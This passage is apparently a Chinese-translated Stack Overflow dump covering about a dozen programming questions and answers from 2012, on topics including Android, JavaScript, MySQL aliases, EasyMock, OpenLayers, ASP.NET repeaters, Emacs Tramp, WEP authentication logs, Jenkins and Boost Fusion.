        mRenderer.setBarSpacing(0.7f);

    //  mRenderer.setChartTitleTextSize(20);
    //  mRenderer.setLabelsTextSize(25);
    //  mRenderer.setMarginsColor(Color.WHITE);

final GraphicalView grfv =  ChartFactory.getBarChartView(BarGraphActivity.this, dataset, mRenderer, Type.DEFAULT);
    return grfv;
    }
    return null;
    }
} 
```

任何想法？

感谢您宝贵的时间！..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:34:16.437

这个怎么样：

You keep the text fields and when the textfeild is selected a DateTime Picker dialog appears, and the textfield retains the datetime format.

```
final Calendar c = Calendar.getInstance();
mYear = c.get(Calendar.YEAR);
mMonth = c.get(Calendar.MONTH);
mDay = c.get(Calendar.DAY_OF_MONTH);
updateDisplay(); 
```

并在更新显示方法中：

```
private void updateDisplay() {
    checkdate.setText(
            new StringBuilder()
            // Month is 0 based so add 1
            .append(mMonth + 1).append("-")
            .append(mDay).append("-")
            .append(mYear).append(" "));
} 
```

也添加到活动

```
@Override
protected Dialog onCreateDialog(int id) {
    // TODO Auto-generated method stub
    switch (id) {
    case DATE_DIALOG_ID:
        return new DatePickerDialog(this,
                mDateSetListener,
                mYear, mMonth, mDay);
 }
}
@Override
protected void onPrepareDialog(int id, Dialog dialog) {
    // TODO Auto-generated method stub
    switch (id) {
    case DATE_DIALOG_ID:
        ((DatePickerDialog) dialog).updateDate(mYear, mMonth, mDay);
        break;
    }
}
private DatePickerDialog.OnDateSetListener mDateSetListener =
    new DatePickerDialog.OnDateSetListener() {
    @Override
    public void onDateSet(DatePicker view, int year, int monthOfYear,
            int dayOfMonth) {
        // TODO Auto-generated method stub
        mYear = year;
        mMonth = monthOfYear;
        mDay = dayOfMonth;
        updateDisplay();
    }
}; 
```

并将焦点侦听器添加到文本字段

```
textfield1.setOnFocusChangeListener(new OnFocusChangeListener(){
        @Override
        public void onFocusChange(View v, boolean hasFocus) {
            // TODO Auto-generated method stub
            if(hasFocus){
                showDialog(DATE_DIALOG_ID);
            }
        }
    }); 
```

希望它是你需要的。

# javascript - 代码审查 - if else 功能

> ID：13491138
> 
> 赞同：0
> 
> 时间：2012-11-21T10:23:49.197
> 
> 标签：javascript, if-statement

我一生都无法理解为什么会出现错误：

“类型错误：eCurVar 未定义”。请查看下面的代码。

```
 var aBBTemplates = document.getElementsByClassName ("cBBTemplates");
    var i = 2;
    while (i < aBBTemplates.length)
    {
        var eCurVar = aBBTemplates[i];
        if (eCurVar === e.target)
        {
            eCurVar.style.zIndex = 3;
     // type error: eCurVar is undefined on the following line. 
        }   else if (eCurVar.style.zIndex === 3)    {
            console.log (eCurVar);
            eCurVar.style.zIndex = 3-1;
        }   else
        {
            console.log (eCurVar)
            eCurVar.style.zIndex = i;
        }
        i--;
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:26:49.353

在每次迭代后`i`减少一个单位......并且在三次迭代后它变为负数；所以你读`aBBTemplates[-1]`你得到`undefined`。

当您无法理解几个`console.log`s 发生了什么时，最好的办法是添加一条`debugger;`指令，然后打开您的开发工具（通常按 F12）。

至于您的问题，您可以通过添加检查来解决它`i`：

```
while (i < aBBTemplates.length && i >= 0) {
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:27:59.687

你从`i`等于 2 开始。让我们假设它`aBBTemplates[2]`返回一些有意义的东西。你用它做一些事情，它们就会*递减* `i`。让我们假设`aBBTemplates[1]`有意义。

继续下去，迟早会`i`变成-1，读起来肯定没有意义`aBBTemplates[-1]`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:28:39.533

进入 if 函数检查 eCurrVar 是否也不为空

```
if (eCurVar != null && eCurVar === e.target){
// your code
} else {
// if ecurvar == null or ecurvar != e.targer
} 
```

同时检查你`i`是否是正数，因为数组不包含具有负索引的项目：

```
while(i >= 0 && i < aBBTemplates.length) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-21T10:25:17.250

在第二种情况下`aBBTemplates[i]`可能返回`null`

# android - 获取位置（BroadcastReceiver、LocationListener）

> ID：13491143
> 
> 赞同：1
> 
> 时间：2012-11-21T10:24:10.860
> 
> 标签：android, sms, location, broadcastreceiver, locationlistener

我是android的初学者。我有个问题。我想在收到短信时获取我的位置（纬度和经度）。我能怎么做。如果您有示例代码，它将更有帮助。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T10:32:51.683

要在设备上收到短信后获取纬度和经度，您需要以下步骤：

**第 1 步：** 注册一个`android.provider.Telephony.SMS_RECEIVED`BroadcastReceiver 以接收传入的短信通知：

为此，您可以使用以下教程：

[http://androidsourcecode.blogspot.in/2010/10/receiving-sms-using-broadcastreceiver.html](http://androidsourcecode.blogspot.in/2010/10/receiving-sms-using-broadcastreceiver.html)

* * *

**第2步：**

要在收到的短信上检索位置，您需要`IntentService`在 SMS BroadcastReceiver 的 onReceive 中启动一个服务 ()，如下所示：

```
public class SmsReciever extends BroadcastReceiver {

 private static final String TAG = "Message recieved";

 @Override
 public void onReceive(Context context, Intent intent) {    
    if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
      // Start your Location IntentService here 
             Intent i = new Intent(context, Location_Intent_Service.class);
            context.startService(i);
    }
 }

} 
```

* * *

对于我们如何使用[IntentService](http://developer.android.com/reference/android/app/IntentService.html)，您可以查看以下教程：

[http://mobile.tutsplus.com/tutorials/android/android-fundamentals-intentservice-basics/](http://mobile.tutsplus.com/tutorials/android/android-fundamentals-intentservice-basics/)

* * *

对于我们如何使用Service 类中的[LocationManager](http://developer.android.com/reference/android/location/LocationManager.html)，您可以关注以下帖子：

[将 LocationManager 作为服务启动 Android](https://stackoverflow.com/questions/8672736/starting-locationmanager-as-service-android)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:38:21.947

请参考[这个例子](http://mansivora.blogspot.in/2011/03/google-map-give-current-location-as.html)。我希望它对你有帮助。

在此示例中，将显示当前位置，并且触摸位置也将显示经纬度。

# facebook - facebook signed_request 不包含“喜欢”参数

> ID：13491144
> 
> 赞同：0
> 
> 时间：2012-11-21T10:24:11.153
> 
> 标签：facebook, facebook-like, facebook-php-sdk

我正在尝试使用以下代码检查用户是否喜欢我的应用程序：

```
$signed_request = $facebook->getSignedRequest();
$liked = $signed_request['page']['liked'];
echo($liked); 
```

但它不返回任何东西。另一方面，如果我这样做：

```
$signed_request = $facebook->getSignedRequest();
$expires = $signed_request['expires'];
echo($expires); 
```

它确实返回了一个适当的值。这与权限有关吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:31:12.280

只有当它是一个页面选项卡应用程序时，您才能使用 signed_request 获取页面信息参数。如果它是画布应用程序，您可以通过 FQL 查询获得类似信息：

```
SELECT uid FROM page_fan WHERE page_id="PAGE_ID" and uid = me() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-10T14:22:19.400

### 对于新应用程序，此字段不再可用。

> 此字段将不再包含在 v2.1（2014 年 8 月 7 日）发布后创建的任何应用程序中，并将在 2014 年 11 月 5 日为所有其他应用程序永久设置为 true。

请参阅参考：[https ://developers.facebook.com/docs/reference/login/signed-request](https://developers.facebook.com/docs/reference/login/signed-request)

# php - mysql php从2个表中选择字段，具有相同的字段名称

> ID：13491148
> 
> 赞同：5
> 
> 时间：2012-11-21T10:24:23.883
> 
> 标签：php, mysql, prefix

所以我有一个定制的 CMS，它允许动态创建表单和列表等。我注意到它抓取列表数据的问题，这与数据库中的批准表冲突。

问题是，如果包含数据的表的字段名称与批准表中的字段名称相同，那么当我 mysql_fetch_array 并返回数组中的值时，它只会返回一个字段名称

所以一个返回的例子

```
Array
(
    [id] => 1
) 
```

理想情况下，我希望它返回为

```
Array
(
    [approvals.id] => 1
    [affiliates.id] => 2
) 
```

那么我怎样才能让它在结果数组的表名前加上前缀来抵消称为同一事物的字段名呢？我不想更改字段名称，因为它非常嵌入。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T10:27:08.513

通常在 SQL 语句中使用别名：

```
SELECT table1.id as t1_id, table2.id as t2_id FROM ..... 
```

然后，当您进行获取时，您将以这种方式访问​​它：

```
echo $row['t1_id']; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:27:08.860

使用 mysql 别名

审批表 ID 别名为 [id ASapprovals.id]

附属表 id 别名为 [id AS associates.id]

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:27:26.597

在查询中使用别名：

```
SELECT approvals.id AS approvals_id, affiliates.id AS affiliates_id ... 
```

然后关联数组将包含：

```
echo $row['approvals_id']; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-21T10:27:52.227

> 问题是，如果包含数据的表的字段名称与批准表中的字段名称相同

您必须使用不同的别名来别名这些字段的名称。就像是：

```
SELECT 
   approvals.id approvalsid,
   affiliates.id affiliatesid
    ...
FROM
... 
```

# python - 如何使用 Python 代码运行 Windows powercfg 的功能？

> ID：13491149
> 
> 赞同：2
> 
> 时间：2012-11-21T10:24:24.210
> 
> 标签：python, windows, call, subprocess, powercfg

尝试将 Python 用于文本解析之外的其他用途，并认为最好的方法是编写一个我会觉得有用的脚本。尽管在拨打电话时出现错误，但我遇到了问题。

```
from subprocess import call
call (["powercfg", "/batteryreport"]) 
```

我收到的错误如下：

> 发生了意外的错误情况。无法执行操作。您可能无权执行此操作。

我已经在提升的用户权限下运行命令提示符，也没有骰子。任何帮助，将不胜感激。

*注意：对于那些不熟悉的人，此命令会在您的用户目录 (C:\Users\Name) 中创建一个关于您在 Windows 上的电池使用情况的 HTML 文件。*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:16:52.063

也许您可以使用 powercfg.exe 的完整路径？

也许你可以调用([ ... ], shell=True)？

也许您可以检查 call() 的返回值？

# asp.net-mvc - MVC 客户端验证做数据库检查

> ID：13491152
> 
> 赞同：2
> 
> 时间：2012-11-21T10:24:35.460
> 
> 标签：asp.net-mvc, asp.net-mvc-3, jquery, asp.net-mvc-validation

有没有办法通过 MVC 中的客户端验证执行“数据库”检查？

我有以下课程

```
public class EmailCheck : ValidationAttribute,IClientValidatable
{
    protected override ValidationResult IsValid(object value, ValidationContext validationContext)
    {
        string sErrorMessage = "Email already exists";
        return new ValidationResult(sErrorMessage); 
    }   

    public IEnumerable<ModelClientValidationRule> GetClientValidationRules(ModelMetadata metadata, ControllerContext context)
    {
        ModelClientValidationRule validationRule = new ModelClientValidationRule();
        validationRule.ValidationType = "checkemail";
        validationRule.ErrorMessage = "Invalid Email Format";
        validationRule.ValidationParameters.Add("param", "");
        return new List<ModelClientValidationRule> { validationRule };
    }  
} 
```

我希望客户端验证也调用“IsValid”方法 onkeyup/lost focus，而不仅仅是在“checkemail”javascript 函数中进行常规 javascript 检查。

我拥有的javascript函数如下：

```
//Validation for Well-Formed Email
jQuery.validator.addMethod("checkemail",
    function (value, element, param) {
        var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;

        if (!emailReg.test(value))
            return false;

        return true;
    });

jQuery.validator.unobtrusive.adapters.add("checkemail", ["param"], function (options) {    
    options.rules["checkemail"] = options.params.param;
    options.messages["checkemail"] = options.message;
}); 
```

如果有人能指导我正确的方向或提供类似的教程，我将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T12:41:58.243

在您的模型中尝试使用“远程”属性

[http://msdn.microsoft.com/en-us/library/gg508808%28v=vs.98%29.aspx](http://msdn.microsoft.com/en-us/library/gg508808%28v=vs.98%29.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-15T16:40:44.537

Rusty 是正确的，你需要在你的模型中使用 Remote 属性

这是另一个示例，其中包含仅用于 MVC 中的电子邮件验证的完整详细信息

[来自 asp.net 中数据库的电子邮件的 MVC 模型验证](http://www.advancesharp.com/blog/1029/mvc-model-validation-for-email-from-database-in-asp-net)

# ios - UITableView 在添加单元格时不会改变 UIScrollView 的大小

> ID：13491153
> 
> 赞同：0
> 
> 时间：2012-11-21T10:24:37.957
> 
> 标签：ios, xcode, scrollview, tableview

与 UITableView 一起存在的滚动视图不会改变它的大小。所以我有一个 UITableView，其中单元格是由用户添加的。添加这些单元格后，我正在打电话

[self.tableView reloadData];

现在 tableView 显示了用户添加的新单元格。美好的。但是，如果 tableView 变得更大，如果它太大而无法在视图中显示所有内容，它不会改变我的 scrollView 的大小。除了 UITableView 附带的“普通”滚动视图外，我的视图中没有滚动视图。所以我不能滚动到最后一行，因为scrollView“太小”。有什么我忘记了吗？我在想类似的东西

[self.tableView.scrollView 重新加载];

我在另一个类中使用了相同的概念：用户能够添加单元格并显示它们。但在另一个类中，scrollView 正确“调整大小”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:35:51.460

我假设您在滚动视图中有表格。添加单元格后，您需要更改滚动视图的内容大小。内容大小的高度应根据滚动视图中的内容而变化，以便您可以滚动浏览整个内容。

**更新的答案：**

我认为您的 tableview 的框架更大。它正在跨越窗口的界限。尝试最小化 tableview 的高度。

# debugging - Intellij 中的 EasyMock 感知调试器？

> ID：13491157
> 
> 赞同：0
> 
> 时间：2012-11-21T10:24:48.850
> 
> 标签：debugging, junit, intellij-idea, easymock

也许这会适得其反，我不知道，但现在我需要一个 IntelliJ 中的调试器，它知道 EasyMock 模拟，尤其是模拟方法实际返回的内容。

例如，我有一个传输接口`ITransport`，它有一些必须模拟的方法，而我只希望一些方法返回一些东西。例如

```
ITransport myTransport = createMock(ITransport.class); 
```

我希望 myTransport.getID() 返回一个模拟的 ID 10。

```
expect(myTransport.getID()).andReturn(10); 
```

对于 ID 10，我希望调用一次方法，

```
expect(myTransport.publish(any(...)));

expectLastCall.once(); 
```

传输类中的某些内容中断并且`myTransport`未被调用，并且我的测试失败。知道我只想用调试器单步执行代码来检查我的测试失败的原因。所以我添加了一个断点来验证模拟`myTransport`对象的值。但是他们都说“空”，甚至是ID。所以我假设，经过一些简短的调查，这是因为 EasyMock 模拟类的原因，它并没有真正用值更新对象（这听起来很合理），而是在调用方法时在运行时返回模拟值。

那么，是否有任何用于 IntelliJ 的模拟感知调试器让我看到该方法最终将返回哪个值。

是的，在我收到回复说“如果您为所有内容编写单元测试就不需要调试器”之前，我只想声明我知道这一点。这是遗留代码，或者至少是没有考虑测试的代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T10:04:54.557

这可能不是您要寻找的……但感觉问题更多出在调试方法上。

模拟对象实际上就是这样 - 模拟 - 意味着它是一个假的空对象，除非你明确告诉它，否则它不会做任何事情。当您的调试器检查模拟对象时，它不会找到您没有专门对其进行编程以返回的任何值。它并不意味着持有价值。

EasyMock 有一个参数捕获功能，但由于您只是希望它用于调试，这可能是错误的方法。Mockito 有一个间谍功能，可能适合你想要的，但它会涉及额外的模拟编程语句。

我想说最简单的方法是实现你自己的`ITransport`，只是为了在你的测试类中使用。这样你就可以实现`getID()`总是返回`10`并在你的`publish()`. 并且您可以实现您需要的任何其他方法，以便为调试目的捕获额外的数据。而且您可以保留此测试仅`ITransport`用于共享使用或将来的调试需求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T17:16:59.863

事实上，这些方法是模拟的，但类的内部实现留给它自己。

通常，您不需要知道返回的内容，因为您是首先记录它的人。

您还可以在调试器中评估 myTransport.getID()。但是这样做会消耗期望值。

但是，能够在模拟中列出所有当前未决的期望似乎是一个好主意。也许有一个窥视功能。您可以在 EasyMock 错误跟踪器上请求此类功能：http: [//jira.codehaus.org/browse/EASYMOCK](http://jira.codehaus.org/browse/EASYMOCK)

# javascript - OpenLayers 矢量特征/图层不可见（不渲染）

> ID：13491164
> 
> 赞同：0
> 
> 时间：2012-11-21T10:25:12.633
> 
> 标签：javascript, openlayers

我不明白为什么样式化的矢量图层是不可见的？似乎没有任何功能，但为什么呢？这段代码有错误吗？OSM，Google Layers 是可见的，我可以在 LayerSwitcher 中切换它们（并且覆盖层“Vectorlayer”也存在在那里）。图标的 URL 正确。

```
<html>
    <head>
        <meta charset="utf-8" />
        <title>Index</title>
        <link href="/Content/jquery-ui.css" rel="stylesheet" type="text/css" />
        <script src="/Scripts/jquery-1.6.2.min.js" type="text/javascript"></script>
        <script src="/Scripts/jquery-ui-1.8.16.custom.min.js" type="text/javascript"></script>
        <script src="http://maps.google.com/maps/api/js?v=3&sensor=false" type="text/javascript"></script>
        <script src="/Scripts/OpenLayers.js" type="text/javascript"></script>

    <script type="text/javascript">
function Startit() {
    var dislon = 30.4958316666667;
    var dislat = 59.9168383333333;
    var lonlat = new OpenLayers.LonLat(dislon, dislat);
    var map = new OpenLayers.Map({div: "mapcontent",projection: new OpenLayers.Projection("EPSG:900913")});
    var maposm = new OpenLayers.Layer.OSM("OSM");
    var gmap = new OpenLayers.Layer.Google("Google", { numZoomLevels: 20 });
    var ghyb = new OpenLayers.Layer.Google("Google Earth", { type: google.maps.MapTypeId.HYBRID, numZoomLevels: 20 });
    map.addLayers([maposm, gmap, ghyb]);
    lonlat.transform(new OpenLayers.Projection("EPSG:4326"), new OpenLayers.Projection("EPSG:900913"));
    map.setCenter(lonlat, 11);
    var lSwitch = new OpenLayers.Control.LayerSwitcher();
    map.addControl(lSwitch);
    var sdLayer = new OpenLayers.Layer.Vector("VectorLayer");
    var cStyle = { externalGraphic: "/images/icons/blue.png", graphicWidth: 35, graphicHeight: 35 };
    var currPoint = OpenLayers.Geometry.Point(dislon,dislat);
    var ft = new OpenLayers.Feature.Vector(currPoint, null, cStyle);
    map.addLayer(sdLayer);
    sdLayer.addFeatures([ft]);
}
    </script>

    </head>
    <body onload="Startit();">
        <div id="mapcontent" style="width:500px;height:400px;"></div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T08:27:58.913

=) 天哪！这只是愚蠢的错误>>> var currPoint = **new** OpenLayers.Geometry.Point(dislon,dislat);

# spring - 如何压缩从 Spring AbstractExcelView 创建的文件

> ID：13491165
> 
> 赞同：1
> 
> 时间：2012-11-21T10:25:11.663
> 
> 标签：spring, download, compression

我正在使用 spring AbstractExcelView 在我的应用程序中创建一个 excel 文件。

我面临的问题是生成的 excel 文件变得太大。

有没有办法压缩从 AbstractExcelView 生成的文件并将其下载为 zip 文件

生成的 excel 接近 15 MB，但是当我手动压缩文件时，它是 700KB，所以有很大的不同。

在 spring 中压缩 AbstractExcelView 输出的任何提示

# asp.net - 中继器内的中继器未正确绑定

> ID：13491170
> 
> 赞同：0
> 
> 时间：2012-11-21T10:25:29.973
> 
> 标签：asp.net, html, data-binding, webforms, repeater

我在另一个里面有一个中继器。像这样：

```
<asp:Repeater ID="CategoryRepeater" runat="server" OnItemDataBound="ItemBound">
    <ItemTemplate>
        <div class="groupbox">
            <fieldset>
                <legend><%# Container.DataItem %></legend>
                <table>
                    <asp:Repeater ID="ItemRepeater" runat="server">
                    <ItemTemplate>
                        <tr>
                        <td>
                            <asp:CheckBox id="chkItem" runat="server" Text='<%# Eval("Text")%>' />  
                            <asp:Button ID="btnXRefs" Text="x-refs" runat="server" CssClass="xRefButton" OnClick="btnSelectXRefs_Click" />
                        </td>
                        </tr>
                    </ItemTemplate>
                    </asp:Repeater>
                </table>
            </fieldset>
        </div>
    </ItemTemplate>
</asp:Repeater> 
```

代码背后：

```
 protected void Page_Load(object sender, EventArgs e)
    {
        if (!Page.IsPostBack)
        {
            using (var db = new DbContext())
            {
                CategoryRepeater.DataSource = db.Categories.OrderBy(x => x.Heading).Select(x => x.Heading).Distinct();
                CategoryRepeater.DataBind();
            }
        }
    }

    protected void ItemBound(object sender, RepeaterItemEventArgs args)
    {
        if (args.Item.ItemType == ListItemType.Item)
        {
            Repeater childRepeater = (Repeater)args.Item.FindControl("ItemRepeater");
            var item = args.Item as RepeaterItem;
            using (var db = new DbContext())
            {
                childRepeater.DataSource = db.Categories.Where(x => x.Heading == item.DataItem).OrderBy(x => x.Text);
                childRepeater.DataBind();
            }
        }
    } 
```

我的目标是首先`groupboxes`使用顶层制作许多项目，然后将项目绑定到每个项目中。所以我最终得到了许多小的堆叠复选框列表。

问题是，所有顶级框都出现了，但只有第一个包含复选框项目，即。只有第一个是内部绑定的，并且该`ItemBound`方法只为第一个调用一次。

任何想法为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:54:23.187

这条线

```
if (args.Item.ItemType == ListItemType.Item) 
```

应该是这样的

```
if(args.Item.ItemType = ListItemType.Item || 
   args.Item.ItemType == ListItemType.AlternatingItem) 
```

# java - 有没有更好的方法通过使用一些 Java EE、JPA 框架在数据库中创建一些自定义字段？

> ID：13491173
> 
> 赞同：3
> 
> 时间：2012-11-21T10:25:45.130
> 
> 标签：java, jpa, orm, dynamically-generated

我们使用 Oracle ADF 平台构建 Web 应用程序并扩展到 webcenter 门户应用程序。

Java 开发团队目前的期望是改变我们的开发方式/方法，以便在应用程序中添加一些字段不需要任何开发工作。换句话说，当您想以某种形式添加数据字段（至少与任何字段无关）时，将字段的一些元数据保存到数据库中以及在应用程序中执行相关的作业/命令就足够了. 此外，我们需要根据添加的字段动态渲染视图。

从本质上讲，我认为这样的期望不适合 Java 世界，但如果可能或者如果有人有这样做的经验，我会想使用它。我们不希望通过 JDBC 使用本机 SQL 直接与数据库交互，因为这意味着要脱离 ADF 框架。

# emacs - 在 Emacs Tramp 模式下刷新远程目录

> ID：13491174
> 
> 赞同：16
> 
> 时间：2012-11-21T10:25:46.780
> 
> 标签：emacs, ssh, tramp, ido

我一直在我的 Emacs 上使用 Tramp 模式来远程编辑文件。我也在使用ido模式。当我在使用 Tramp 打开的文件的同一目录中添加新文件时，我无法让 Tramp 找到新文件（使用 Cx Cf）。有没有办法刷新流浪汉？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2014-09-30T18:27:50.087

您的问题是关于与 tramp 一起使用的 ido-mode。要在查找文件的过程中刷新 ido 自动完成，您可以按 Cl `ido-reread-directory`。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-11-21T10:41:35.377

如此[处](http://emacs.1067599.n5.nabble.com/tramp-does-not-see-directory-changes-td242710.html)所述，您可以按下`g`dired 缓冲区以运行`revert-buffer`并刷新目录列表。

# ios - 弹出框控制器的固定子视图，里面有一个表视图

> ID：13491188
> 
> 赞同：1
> 
> 时间：2012-11-21T10:26:32.380
> 
> 标签：ios, ipad, uitableview, uipopovercontroller

我正在尝试将悬停子视图添加到 UIPopoverController。我有一个表格视图控制器作为弹出框内的内容视图控制器。我尝试将其添加为普通子视图：

```
UIPopoverController* popoverController = [[UIPopoverController alloc] initWithContentViewController:myTableViewController];
UIView* mySubview = ...
[popoverController.contentViewController.view addSubview:mySubView]; 
```

它显示正确，但不幸的是随着表格视图上下滚动。我想固定它的位置。

我还尝试通过表视图控制器的 scrollViewDidScroll: 方法中的滚动视图的 y 偏移量来更新子视图的位置，但如果可能的话，我想避免这种解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T18:18:44.980

您必须使内容控制器成为 UIViewController 子类而不是 UITableViewController 子类。

# linux-kernel - 如何检查Linux中的WEP身份验证是否失败

> ID：13491189
> 
> 赞同：0
> 
> 时间：2012-11-21T10:26:33.813
> 
> 标签：linux-kernel, embedded-linux

如果在开放模式下使用 WEP 安全，那么运行 Linux 内核的客户端如何能够检查由于错误的密钥而导致身份验证失败，但因为它是 WEP 开放模式，所以关联成功。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T12:46:04.193

您将在 wpa_supplican 的日志中看到这一点。它看起来像这样（对不起，只是我在互联网上找到的随机示例）：

```
[  778.327092] wlan0: associated
[  778.332503] ADDRCONF(NETDEV_CHANGE): wlan0: link becomes ready 
[  788.334222] wlan0: disassociating from 00:1c:f0:b1:80:6a by local choice (reason=3) 
[  788.341433] cfg80211: Calling CRDA for country: US 
[  788.342348] wlan0: deauthenticating from 00:1c:f0:b1:80:6a by local choice (reason=3) 
[  789.122029] wlan0: no IPv6 routers present 
[  789.263341] wlan0: authenticate with 00:1c:f0:b1:80:6a (try 1) 
[  789.463049] wlan0: authenticate with 00:1c:f0:b1:80:6a (try 2) 
[  789.663048] wlan0: authenticate with 00:1c:f0:b1:80:6a (try 3) 
[  789.863057] wlan0: authentication with 00:1c:f0:b1:80:6a timed out 
```

从上面的日志可以看出，客户端已经成功关联（778.327092），但在认证阶段失败（789.863057）。

您还可以使用 *wpa_cli* 及其“状态”命令：

```
> status 
bssid=00:1c:f0:b1:80:6a 
ssid=KLUK2 
id=1 
mode=station 
pairwise_cipher=NONE 
group_cipher=NONE 
key_mgmt=IEEE 802.1X (no WPA) 
wpa_state=ASSOCIATED 
Supplicant PAE state=CONNECTING 
suppPortStatus=Unauthorized 
EAP state=IDLE 
<2>Authentication with 00:1c:f0:b1:80:6a timed out. 
> <2>CTRL-EVENT-DISCONNECTED bssid=00:00:00:00:00:00 reason=3 
> <2>CTRL-EVENT-DISCONNECTED bssid=00:00:00:00:00:00 reason=3 
> <2>CTRL-EVENT-SCAN-RESULTS 
> <2>Trying to authenticate with 00:1c:f0:b1:80:6a (SSID='KLUK2' freq=2437 MHz) 
<2>CTRL-EVENT-SCAN-RESULTS 
<2>CTRL-EVENT-BSS-REMOVED 0 00:1d:19:cd:43:a1 
> <2>CTRL-EVENT-BSS-REMOVED 1 00:24:fe:82:ea:d9 
> <2>CTRL-EVENT-BSS-REMOVED 2 00:04:0e:8e:a7:fe 
> <2>CTRL-EVENT-SCAN-RESULTS 
```

# jenkins - Jenkins - 在远程机器上运行安装测试并将结果报告给 Jenkins

> ID：13491193
> 
> 赞同：5
> 
> 时间：2012-11-21T10:26:38.183
> 
> 标签：jenkins, automated-tests

我希望添加一些自动化测试以在项目上每晚运行。目前，该项目有一些工作可以创建项目各种组件的多个构建。

构建创建 rpm 文件，有多个作业创建多个 rpm，我想获取所有 rpm 并安装它们并在单个*测试*作业下测试它们，彼此之间有很多依赖关系。我可以通过命令行安装，但这些 rpm 存储在 Jenkins 主机上。

这是据我所知；

*   我已经在詹金斯建立了工作
*   我为作业创建了一个奴隶
*   我已经使用 Jenkins 在奴隶上运行 bash 脚本（作品）

我想做的是以下内容；

*   定期（假设我知道构建已全部完成时每天一次）获取所有项目的最新通过构建并将它们复制到从机
*   使用脚本安装 rpm。
*   该脚本在安装期间执行某些测试（查看日志等），所以我想收集所有这些并将结果发送回 Jenkins（最终也可能在这里执行其他测试）
*   我希望通过我自己的测试来确定*最后一个构建映像的状态*
*   我还希望将测试结果、日志等存储在 Jenkins 测试作业中，以便我们可以查看它们并惊叹它们的精彩！

我不知道该怎么做；

1.  如何将文件复制到从站？是否应该使用 wget 或其他东西在从站本身上处理，或者 Jenkins 是否具有为我处理这一切的功能（可能是插件）？
2.  如何将我的自定义结果报告给 Jenkins 工作？

我三天前才开始与 Jenkins 合作（项目和 Jenkins 构建工作比这要老得多），如果我遗漏了任何明显的东西，我深表歉意。

**更新**

我在想这些插件的组合可能会奏效，不过我还没有过多地研究这些插件。

[复制工件插件](https://wiki.jenkins-ci.org/display/JENKINS/Copy+Artifact+Plugin)以从其他作业的最新稳定版本中复制 rpm

[xUnit 插件](https://wiki.jenkins-ci.org/display/JENKINS/xUnit+Plugin)来解释我在测试过程中生成的一些 xml 文件

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T23:29:17.840

我实际上并不需要任何插件。我只是将作业设置为在从属设备上运行，有一个构建步骤来运行一些测试并生成一个 xml 文件（类似于 jUnit xml 结果），然后添加一个构建后步骤来查看 jUnit 结果（即使测试不是 jUnit 测试）。

这很有效，如果他们未能通过我指定的测试，我会将构建标记为不稳定，就像他们是否安装了 rpm 并且发生了这样那样的事情。

我能够获得最新的稳定版本，因为无论如何都会将最新的稳定版本复制到文件服务器，任何失败的版本都不会去那里，所以这很简单。

# c++ - 提升融合和常量正确性

> ID：13491195
> 
> 赞同：1
> 
> 时间：2012-11-21T10:26:43.897
> 
> 标签：c++, constants, boost-fusion

我正在学习 boost fusion，并试图了解`std::vector<boost::fusion::vector<int,double,double> >`. 代码看起来很简单，但我似乎遇到了一些 const 问题。我显然误解了一些关于 const 的事情，并且希望有人能解释我哪里出错了。

编码：

```
template<int N, class T>
struct viewTraits{
    typedef typename T::value_type etype;
    typedef typename boost::fusion::result_of::as_nview<etype, N>::type netype;
    typedef std::vector<netype> result_type;
};

template <int N, typename T>
typename viewTraits<N,T>::result_type c( T const &t ) 
{
   typename viewTraits<N, T>::result_type retVal;  
    for (typename T::const_iterator it(t.begin());it<t.end();++it){
        retVal.push_back(fusion::as_nview<N>(*it));
    } 
    return retVal;
}

template <typename Container>
typename Container::value_type sum( Container const &container )
{
    typedef typename Container::value_type value_type;
    return std::accumulate( container.begin(), container.end(), value_type() );
}

int main(){
    typedef fusion::vector<int, double, double>             row;
    typedef std::vector<row>                                                container;

    container x;
    b( x, 200 );
    std::cout << sum(c<1>(x)) << std::endl;
} 
```

`retVal.push_back()`由于转换 const 的问题，代码无法编译。我尝试了几种删除和添加一些 const 关键字的排列，但在排列编程方面没有成功，我宁愿理解我在做什么。

有人有什么想法吗？顺便说一句`const`，函数定义中的`sum`and`c`必须保留。

编辑：我忘了提到`b`填充`x`是`std::vector<fusion::vector<int, double, double> >`

EDIT2：更正的代码：

```
template<int N, class T>
struct viewTraits{
    typedef typename T::value_type etype;
    typedef typename fusion::result_of::as_nview<etype, N>::type netype;
    typedef typename fusion::result_of::at_c<netype,0>::type reference;
    typedef typename boost::decay<reference>::type value_type;
    typedef std::vector<value_type> result_type;
};

template <int N, typename T>
